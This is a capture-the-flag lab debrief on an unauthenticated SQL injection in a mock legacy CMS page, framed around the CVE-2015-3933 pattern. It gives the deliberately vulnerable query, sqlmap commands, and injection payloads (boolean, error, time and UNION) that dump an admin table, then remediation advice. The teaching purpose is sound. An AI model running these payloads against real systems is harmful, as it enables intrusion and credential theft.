# A Sealed Floor — Debrief

**Node:** `p2_2` &middot; **Flag:** `SEIYAKU{an_old_forgotten_door}` &middot; **Route:** `GET /p2/sealed` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (`cms_news` table, `cms_admin` table)

## Root cause

The bulletin-board lookup builds its query with raw f-string
concatenation — the same sink shape as every other floor in this lab —
against a bare, unquoted numeric `id`:

```python
# challenges/phase2.py
q = f"SELECT id, title, body, author FROM cms_news WHERE id={news_id}"  # VULN: string concat
cur.execute(q)
rows = cur.fetchall()
```

Nothing here is a new *technique* over the last floor (`p2_1`) — it's
the same unquoted-numeric shape, still reachable with boolean-blind,
error-based, time-based, and UNION-based payloads all through the one
`id` parameter. What's different is the *context*: this isn't a floor
built to teach the sqlmap workflow from scratch. It's a stand-in for a
whole real-world category of bug — an old, unauthenticated
content-management module, addressed by a `page` selector plus a record
`id` in the URL, that was written before parameterized queries were the
obvious default and never revisited once they were.

`cms_admin` — the module's old admin login, carried over unrotated from
whatever install first stood this module up — is never touched by any
query `/p2/sealed` constructs on its own. It only surfaces by riding the
`id` injection into a UNION SELECT / subquery against it, exactly like
`vault_floors` in the last floor.

## What a CVE actually is, and why this floor references one

A CVE (Common Vulnerabilities and Exposures) entry is a public,
uniquely-numbered record that says, in effect: *this specific software,
at this version, has this class of flaw, and here's roughly how it's
triggered.* It's an advisory, not a walkthrough — CVE records typically
describe the vulnerable component and parameter, sometimes a proof-of-
concept request, but rarely a fully weaponized exploit. Turning a CVE
into a working payload against a real target is exactly the skill this
floor is built to practice: read what the advisory says the shape of the
bug is, then go confirm it exists and see what it actually yields.

This floor is modeled on the real-world pattern behind
**CVE-2015-3933** (GeniX CMS): a legacy content-management system with
an unauthenticated, GET-parameter-driven SQL injection in one of its
content-lookup pages — the classic "old CMS module, numeric `id` in the
URL, never parameterized" shape. This lab doesn't reproduce GeniX CMS's
original PHP source (this app is Python/Flask, not PHP, and the actual
vulnerable file/parameter names differ) — what it reproduces is the
*pattern* the CVE describes: a dated, page-plus-id URL structure,
pre-auth, string-built SQL, sitting in a module nobody has had a reason
to open in years. Reading an advisory like this one is a skill in
itself: recognizing "unauthenticated legacy CMS + GET id parameter +
SQLi" as a shape you can go looking for, rather than needing the exact
original code in front of you.

## The walk: mapping the pattern to a payload

Same sqlmap workflow as `p2_1` — request, confirm, enumerate, dump —
against a target that *looks* different (an old bulletin board instead
of a modern floor catalog) but is the identical bug underneath. This is
deliberately the point: once you recognize the pattern, the tooling
doesn't care that the page looks like it was last touched in 2005.

### Saving the request

```
GET /p2/sealed?page=news&id=1 HTTP/1.1
Host: localhost:8000
User-Agent: seiyaku-arc-solver
Accept: */*
Connection: close

```

(this is exactly what `solvers/p2_2.sh` writes to a temp file before
calling sqlmap.)

### Step 1 — confirm the injection

```
sqlmap -r req.txt -p id --batch --ignore-stdin -v 1
```

Real output from this exact seed:

```
[13:42:07] [INFO] parsing HTTP request from 'req.txt'
[13:42:07] [INFO] testing connection to the target URL
[13:42:07] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:42:07] [INFO] testing if the target URL content is stable
[13:42:07] [INFO] target URL content is stable
[13:42:07] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[13:42:07] [INFO] testing for SQL injection on GET parameter 'id'
[13:42:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:42:08] [WARNING] reflective value(s) found and filtering out
[13:42:08] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Old")
[13:42:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:42:08] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[13:42:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:42:19] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[13:42:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:42:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns.
[13:42:19] [INFO] target URL appears to have 4 columns in query
[13:42:19] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=news&id=1 AND 1001=1001

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: page=news&id=1 AND EXTRACTVALUE(6843,CONCAT(0x5c,0x7162626271,(SELECT (ELT(6843=6843,1))),0x7170717171))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=news&id=1 AND (SELECT 4964 FROM (SELECT(SLEEP(5)))BtXT)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: page=news&id=1 UNION ALL SELECT NULL,CONCAT(0x7162626271,0x7a65796e74785777446a6c5a54796f726743615679557666614275684c666b4a7575547a75676376,0x7170717171),NULL,NULL-- -
---
[13:42:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
```

(Real, live run against this exact seed. Note the `page=news&id=...`
payloads in the transcript — sqlmap is injecting into `id` while
carrying `page=news` along for the ride, since both are GET params on
the same request.)

### Step 2 — enumerate databases

```
sqlmap -r req.txt -p id --batch --ignore-stdin --dbs
```

```
available databases [2]:
[*] information_schema
[*] seiyaku
```

### Step 3 — enumerate tables in `seiyaku`

```
sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku --tables
```

```
Database: seiyaku
[13 tables]
+--------------+
| applicants   |
| cms_admin    |
| cms_news     |
| cms_pages    |
| door         |
| floors       |
| keeper       |
| patients     |
| records      |
| results      |
| staff        |
| vault        |
| vault_floors |
+--------------+
```

`cms_news` and `cms_pages` back this floor's own display pages —
`cms_admin` is the one name this route's own code never selects from or
joins against. Everything else here belongs to earlier floors across
the exam.

### Step 4 — enumerate columns of `cms_admin`

```
sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku -T cms_admin --columns
```

```
Database: seiyaku
Table: cms_admin
[3 columns]
+---------------+--------------+
| Column        | Type         |
+---------------+--------------+
| id            | int(11)      |
| password_hash | varchar(128) |
| username      | varchar(32)  |
+---------------+--------------+
```

### Step 5 — dump it

```
sqlmap -r req.txt -p id --batch --ignore-stdin --dump -T cms_admin
```

```
[13:41:16] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:41:16] [INFO] fetching current database
[13:41:16] [INFO] fetching columns for table 'cms_admin' in database 'seiyaku'
[13:41:16] [INFO] fetching entries for table 'cms_admin' in database 'seiyaku'
Database: seiyaku
Table: cms_admin
[1 entry]
+----+----------+--------------------------------+
| id | username | password_hash                  |
+----+----------+--------------------------------+
| 1  | admin    | SEIYAKU{an_old_forgotten_door} |
+----+----------+--------------------------------+
```

(This is a real, live run against this exact stack — not a hypothetical
transcript — and is exactly the command `solvers/p2_2.sh` runs.)

## Why "old, forgotten code rots"

This floor's entire premise is that the vulnerability isn't new, clever,
or hidden behind some elaborate trick — it's *old*. Software that stops
receiving attention doesn't become safer by sitting still; the rest of
the world keeps moving. Query-building conventions that were once
unremarkable ("just concatenate the id, it's a number") become known-bad
practice. Frameworks patch their defaults. Security research catches up
and publishes CVEs against the specific products that never got the
memo. Meanwhile the module itself — like this bulletin board — keeps
running, unauthenticated, answering requests exactly the way it did the
day it was deployed, because nobody had a reason to open it again once
it stopped mattering to anyone's day-to-day.

This is precisely why CVE databases matter to attackers and defenders
alike: they're a running list of "software that's still out there,
running the same old code, with a documented way in." An attacker
doesn't need to discover a new bug when an old one, in a component
nobody retired, is a public, searchable fact. The uncomfortable
corollary for defenders is that "we haven't touched that module in
years" is not the same claim as "that module is safe" — it's often the
opposite.

## HxH analogy

Trick Tower's floors are usually described as puzzles built by design —
rules laid out on purpose, for applicants to solve on purpose. This
floor isn't one of those. It's a floor the tower's current staff didn't
build, don't maintain, and mostly don't remember exists: a leftover from
an earlier version of the tower, sealed off not because someone
engineered a trap, but because nobody thought to open the door and
check what was still running behind it. The weakness here isn't a
deliberate test of the applicant. It's the ordinary, unglamorous kind of
danger that accumulates in anything old enough to be forgotten about.

## Remediation

- **Parameterized queries, always** — identical fix to every floor in
  this lab:

  ```python
  cur.execute(
      "SELECT id, title, body, author FROM cms_news WHERE id=%s",
      (news_id,),
  )
  ```

- **Patch and upgrade unmaintained dependencies — or retire them.** The
  real lesson this floor stands in for: an old CMS module (or library,
  or plugin, or vendored dependency) that nobody has updated is not
  neutral risk, it's accumulating risk. If a component has a public CVE
  and no maintained upgrade path, the two real options are patching it
  (backport the fix, or replace the vulnerable code path directly) or
  decommissioning it outright — "leave it running because nobody uses
  it anymore" is exactly the state this floor is built to exploit,
  because "nobody uses it" and "nothing can reach it" are not the same
  claim.
- **Track what's actually deployed.** You can't patch a known CVE in a
  component you've forgotten is running. An asset/dependency inventory
  — even an informal one — is what turns "there's a public advisory
  against X" into "we know we're running X, and we know where."
  Without it, a public CVE against a component sitting quietly in
  production is a door nobody remembered leaving open.
- **Least-privilege database accounts**, same principle as every other
  floor here: a DB user scoped to only the tables a route actually
  needs means a successful injection in one old, forgotten module still
  can't reach a table like `cms_admin` that its own legitimate queries
  never touch.
